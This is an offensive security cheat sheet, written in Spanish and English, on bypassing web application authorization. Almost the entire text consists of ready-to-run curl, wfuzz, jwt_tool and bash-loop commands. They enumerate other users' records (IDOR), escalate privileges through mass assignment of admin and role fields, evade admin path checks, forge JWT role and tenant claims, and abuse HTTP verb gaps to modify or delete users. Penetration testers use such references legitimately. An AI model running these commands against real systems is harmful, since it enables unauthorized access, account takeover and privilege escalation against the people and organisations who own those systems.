---
aliases:
  - BFLA
  - Privilege Escalation Web
  - RBAC Bypass
tags:
  - vuln/auth-bypass
  - technique/privilege-escalation
  - asset/web-app
primary categories:
  - "[[Red Team]]"
secondary categories:
  - "[[Explotación|Explotación]]"
  - "[[Web]]"
tertiary categories:
  - "[[Web Explotación]]"
kind: SubCheatSheet
linked:
  - "[[Authentication & Authorization Bypass]]"
  - "[[BOLA - IDOR]]"
  - "[[Mass Assignment]]"
---
# Auth Bypass - Bypass de Autorización

---

## IDOR / BOLA (Object-Level)

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| `curl -H "Cookie: session=$MY" https://target/api/users/2` (siendo user 1) | Lee otro user (IDOR sequential) | App sin owner check. |
| `for id in {1..1000}; do curl -s -H "Cookie: session=$MY" -o /dev/null -w "%{http_code} $id\n" https://target/api/users/$id; done \| grep '^200'` | Bulk IDOR enumeration | Sequential IDs. |
| `curl -X PATCH -H "Cookie: session=$MY" -d '{"email":"attacker@evil.com"}' https://target/api/users/2` | Modify other user — combo Mass Assignment | IDOR + write. |
| `curl -H "Cookie: session=$MY" "https://target/api/orders?account_id=42"` (cambiar account_id) | Query param IDOR | Account-scoped resource. |
| `curl -X POST -H "Cookie: session=$MY" -d '{"user_id":2,"action":"x"}' https://target/api/x` | Body field IDOR | Hidden field tampering. |
| `echo "VXNlcjox" \| base64 -d` y `echo -n "User:42" \| base64` | Decode/forge GraphQL global ID | Relay-style IDOR. |
| `curl -X POST -H "Cookie: session=$MY" -d '{"query":"{node(id:\"VXNlcjo0Mg==\"){...on User{email}}}"}' https://target/graphql` | GraphQL global ID IDOR | Forge global ID. |
| `curl -H "Cookie: session=$MY" "https://target/api/users?ids[]=1&ids[]=2&ids[]=3"` | Bulk endpoint IDOR | Array param. |
| `curl -H "Cookie: session=$MY" "https://target/team/B/admin"` (cambiar team) | Multi-tenant IDOR | Path-based tenant scoping. |
| `wfuzz -c -z range,1-1000 -H "Cookie: session=$MY" --hh 24 https://target/api/users/FUZZ` | wfuzz con response-length filter | Auto-detect ID hits. |
^auth-authz-idor

### Workflow IDOR

```bash
# 1. Identify own ID
curl -H "Cookie: session=$MY_TOKEN" https://target/api/users/me
# {id: 1337, ...}

# 2. Bulk enumeration
for id in $(seq 1 1000); do
  CODE=$(curl -s -H "Cookie: session=$MY_TOKEN" -o /dev/null -w "%{http_code}" "https://target/api/users/$id")
  [ "$CODE" = "200" ] && echo "ID $id accessible"
done

# 3. Confirm IDOR by reading sensitive field
curl -H "Cookie: session=$MY_TOKEN" https://target/api/users/1 | jq .email
```

---

## Mass Assignment (Field-Level Privesc)

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| `curl -X PATCH -H "Cookie: $C" -d '{"isAdmin":true}' https://target/api/users/me` | Privesc directo | Update profile sin field filter. |
| `curl -X PATCH -H "Cookie: $C" -d '{"role":"admin"}' https://target/api/users/me` | Role string privesc | RBAC field mutable. |
| `curl -X PATCH -H "Cookie: $C" -d '{"permissions":["*"]}' https://target/api/users/me` | Wildcard permissions | Granular RBAC. |
| `curl -X PATCH -H "Cookie: $C" -d '{"is_superuser":true,"is_staff":true}' https://target/api/users/me` | Django superuser + staff | Django backend. |
| `curl -X PATCH -H "Cookie: $C" -d '{"isAdmin":true}' https://target/api/users/2` (IDOR + MA combo) | Privesc otro user | IDOR + Mass Assign chain. |
| `{"query":"{__type(name:\"UserInput\"){inputFields{name}}}"}` | Discover input type fields (GraphQL) | Pre-attack schema. |
| `{"query":"mutation{updateUser(input:{isAdmin:true}){id}}"}` | GraphQL mutation privesc | GraphQL backend. |
| `for f in isAdmin is_admin admin role roles is_superuser is_staff permissions; do curl -X PATCH -H "$C" -d "{\"$f\":true}" https://target/api/users/me; done` | Bulk field probe | Discovery. |
^auth-authz-mass-assign

---

## Path-Based Privesc

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| `curl https://target/admin` | Forced browsing direct | Client-side auth check. |
| `curl https://target/api/v1/admin` y `curl https://target/api/v2/admin` | Version differential | Old version sin auth. |
| `curl https://target/internal/admin` | Internal namespace exposure | Misconfig externally reachable. |
| `curl "https://target/user/../admin"` | Path traversal escape | Path normalization. |
| `curl https://target//admin` y `curl https://target/./admin` | Path normalization tricks | Router bypass. |
| `curl https://target/admin%2F` (encoded slash) | Encoded path | Decode-after-validate. |
| `curl "https://target/admin/sub-feature"` (subpath check missing) | Subpath bypass | Top-level checked, sub missing. |
| `curl --http2 -H ":path: /admin" https://target/` | HTTP/2 :path injection | H2 pseudo-header. |
| `curl -X POST -H "_method: GET" https://target/admin` | Method override path bypass | Combo. |
| `{"query":"{a:adminQuery{...} b:userQuery{...}}"}` (GraphQL alias) | Alias requested admin field | Per-field check missing. |
^auth-authz-path

---

## Role Manipulation

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| `curl -b "role=admin" https://target/` | Cookie role tampering | Cleartext cookie con role. |
| `python3 jwt_tool.py $JWT -I -pc role -pv admin` | JWT role claim forgery | Combine JWT bypass. |
| `curl -X PUT -H "Cookie: $C" -d '{"role":"admin"}' https://target/api/users/me/role` | Direct API role change | Endpoint sin admin gate. |
| `curl -X POST -H "Cookie: $C" -d '{"group":"admins"}' https://target/api/users/me/groups` | Add self a admin group | Group membership inject. |
| `curl -X POST -H "Cookie: $C" -d '{"scope":"admin read write"}' https://target/oauth/token` | OAuth scope injection | OAuth refresh con scope expansion. |
| `python3 jwt_tool.py $JWT -I -pc tenant_id -pv victim_tenant` | Cross-tenant role swap | JWT tenant claim mutable. |
| Decodear cookie `b64decode + JSON inspect` y modify role | Manual cookie tampering | Self-signed session. |
| `curl -X PATCH -d '{"memberOf":["cn=admin,dc=target,dc=com"]}' https://target/api/users/me` | LDAP DN inject | LDAP-backed apps. |
^auth-authz-role

---

## Verb-Based Authorization Gaps (BFLA)

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| `curl -X POST -H "Cookie: $C" -d '{"email":"x@y.z"}' https://target/admin/users` | POST sin auth check (GET protegido) | Function-level auth gap. |
| `curl -X PATCH -H "Cookie: $C" -d '{"role":"admin"}' https://target/admin/users/2` | PATCH modify sin auth (GET checked) | OWASP API4 BFLA. |
| `curl -X DELETE -H "Cookie: $C" https://target/admin/users/2` | DELETE without admin check | Standard BFLA. |
| `curl -X OPTIONS https://target/admin -i \| grep -i allow` | Lista métodos disponibles | Recon. |
| `curl -X HEAD -H "Cookie: $C" https://target/admin/secret-data -i` | Headers w/o body — info disclosure bypass | HEAD-specific. |
| `curl -X POST -H "X-HTTP-Method-Override: DELETE" -H "Cookie: $C" https://target/admin/users/2` | Method override verb conversion | Spring/Symfony. |
| `curl -X "Get" -H "Cookie: $C" https://target/admin` (case mixed) | Case sensitivity bypass | Strict parsers. |
| `{"query":"mutation{adminAction{result}}"}` (en GraphQL mutation) | Mutations less protected que queries | GraphQL specific. |
| `for m in GET POST PUT PATCH DELETE OPTIONS HEAD FOO; do echo "=== $m ==="; curl -s -X $m -H "Cookie: $C" https://target/admin/users/2 -o /dev/null -w "%{http_code}\n"; done` | Bulk verb probe | Discovery. |
| `curl -X POST -H "Cookie: $C" -d '[{"id":2,"role":"admin"}]' https://target/api/users/bulk` | Bulk endpoint con admin actions | Edge BFLA. |
^auth-authz-bfla

---
